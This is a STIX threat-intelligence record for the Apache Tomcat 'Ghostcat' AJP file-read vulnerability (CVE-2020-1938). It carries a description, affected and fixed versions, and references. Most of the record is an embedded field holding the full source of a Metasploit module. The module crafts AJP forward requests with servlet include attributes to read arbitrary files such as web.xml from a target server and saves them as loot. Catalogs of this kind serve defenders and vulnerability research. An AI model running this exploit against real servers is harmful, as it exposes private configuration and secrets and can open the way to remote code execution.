{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3f033e8-611f-4195-856a-964039e1ad8d",
    "created": "2024-08-14T16:23:23.576356Z",
    "modified": "2024-08-14T16:23:23.57636Z",
    "name": "Apache Tomcat AJP File Read",
    "description": " When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising.  In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP. Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible.  It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/tomcat_ghostcat.rb",
            "external_id": "tomcat_ghostcat.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1938"
        },
        {
            "source_name": "reference",
            "url": "https://www.chaitin.cn/en/ghostcat"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/apache_j_p'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  ApacheJP = Rex::Proto::ApacheJP\n\n  GhostCatResponse = Struct.new(:status, :headers, :body)\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Tomcat AJP File Read',\n        'Description' => %q{\n          When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache\n          Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection.\n          If such connections are available to an attacker, they can be exploited in ways that may be surprising.\n\n          In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP\n          Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended\n          in the security guide) that this Connector would be disabled if not required. This vulnerability report\n          identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application -\n          processing any file in the web application as a JSP. Further, if the web application allowed file upload\n          and stored those files within the web application (or the attacker was able to control the content of the\n          web application by some other means) then this, along with the ability to process a file as a JSP, made\n          remote code execution possible.\n\n          It is important to note that mitigation is only required if an AJP port is accessible to untrusted users.\n          Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files\n          and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were\n          made to the default AJP Connector configuration in 9.0.31 to harden the default configuration.\n          It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes\n          to their configurations.\n        },\n        'Author' => [\n          'A Security Researcher of Chaitin Tech', # POC\n          'SunCSR Team' # Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-1938'],\n          ['EDB', '48143'],\n          ['URL', 'https://www.chaitin.cn/en/ghostcat']\n        ],\n        'DisclosureDate' => '2020-02-20',\n        'Notes' => {\n          'AKA' => ['Ghostcat'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8009, true, 'The Apache JServ Protocol (AJP) port'),\n        OptString.new('FILENAME', [true, 'File name', '/WEB-INF/web.xml'])\n      ]\n    )\n  end\n\n  def send_recv_once(data)\n    buf = ''\n    begin\n      connect\n      sock.put(data)\n      buf = sock.get(30) || ''\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      elog('Error socket', error: e)\n    ensure\n      disconnect\n    end\n    buf\n  end\n\n  def parse_response(buf)\n    parsed_response = GhostCatResponse.new\n\n    until buf.empty?\n      chunk = buf[4...(4 + buf.unpack1('xxn'))]\n      buf = buf[(4 + chunk.length)...]\n\n      case chunk[0].ord\n      when ApacheJP::ApacheJPSendBodyChunk::PREFIX_CODE\n        send_body_chunk = ApacheJP::ApacheJPSendBodyChunk.read(chunk)\n        parsed_response.body = send_body_chunk.body_chunk.to_s\n      when ApacheJP::ApacheJPSendHeaders::PREFIX_CODE\n        send_headers = ApacheJP::ApacheJPSendHeaders.read(chunk)\n        parsed_response.status = send_headers.http_status_code.to_i\n        parsed_response.headers = send_headers.headers.snapshot.map { |header| [header.header_name.to_s, header.header_value.to_s] }.to_h\n      when ApacheJP::ApacheJPEndResponse::PREFIX_CODE\n        break\n      when ApacheJP::ApacheJPGetBodyChunk::PREFIX_CODE\n        next # no need to process this chunk\n      else\n        fail_with(Failure::UnexpectedReply, \"Received unknown AJP prefix code: #{chunk[0].ord}\")\n      end\n    end\n\n    parsed_response\n  end\n\n  def read_success?(ghost_cat_response)\n    ghost_cat_response.status == 200\n  end\n\n  def read_remote_file\n    ajp_forward_request = ApacheJP::ApacheJPForwardRequest.new(\n      http_method: ApacheJP::ApacheJPForwardRequest::HTTP_METHOD_GET,\n      req_uri: '/index.txt',\n      remote_addr: '127.0.0.1',\n      remote_host: 'localhost',\n      server_name: datastore['RHOST'].to_s,\n      headers: [\n        { header_name: 'host', header_value: \"#{datastore['RHOST']}:8080\" }\n      ],\n      attributes: [\n        {\n          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,\n          attribute_name: 'javax.servlet.include.request_uri',\n          attribute_value: 'index'\n        },\n        {\n          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,\n          attribute_name: 'javax.servlet.include.path_info',\n          attribute_value: datastore['FILENAME'].to_s\n        },\n        {\n          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,\n          attribute_name: 'javax.servlet.include.servlet_path',\n          attribute_value: '/'\n        },\n        { code: ApacheJP::ApacheJPRequestAttribute::CODE_TERMINATOR }\n      ]\n    )\n\n    data = \"\\x12\\x34\" + [ ajp_forward_request.num_bytes ].pack('n') + ajp_forward_request.to_binary_s\n    parse_response(send_recv_once(data))\n  end\n\n  def check\n    ghost_cat_response = read_remote_file\n    if read_success?(ghost_cat_response)\n      return Exploit::CheckCode::Appears(\"Successfully read file #{datastore['FILENAME']}\")\n    end\n\n    Exploit::CheckCode::Safe\n  rescue StandardError => e\n    Exploit::CheckCode::Unknown(e.message)\n  end\n\n  def run\n    ghost_cat_response = read_remote_file\n    print ghost_cat_response.body unless ghost_cat_response.body.blank?\n\n    unless read_success?(ghost_cat_response)\n      print_error 'Unable to read file, target may not be vulnerable.'\n    end\n\n    file = store_loot(\n      datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,\n      ghost_cat_response.body, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']\n    )\n    print_good \"File contents save to: #{file}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-20"
}